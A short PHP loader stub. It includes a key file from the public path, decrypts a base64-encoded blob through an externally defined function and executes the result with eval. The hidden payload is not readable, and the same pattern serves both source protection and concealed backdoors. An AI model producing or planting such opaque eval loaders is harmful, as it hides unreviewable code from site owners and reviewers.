<?php
$keyfile = public_path("key.inc.php");
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="QVVSRFpadmZUemU0R2oyVEZvZWx3ZG5qNGx6QjNNWmR3aWNiZkFNOVh1MFlHTkcxRTZnc0EzR3Mrd0dveEhkeFBkb29NWEJ5VUpYWnFEdEthU1NXOTVuV1daUHU3TVVpZXF0SElyRVVrcTVWZElrQTZuRnlUNG1NbWhwaDRmQXNmSTg4bXdxVFREb1VkY3FOc25iYkFseDNoaU8wS2ltMlJrdFJkbE1hM0pyU2RXamoyTG5oTlJKSytPZlVwbVNaTEIwU1dQM1lNODgwVEhpRnRnc1pGQ3FBQUlkYlg1dmpmQytxSHZjdThVST0=";eval(e7061($e7091));

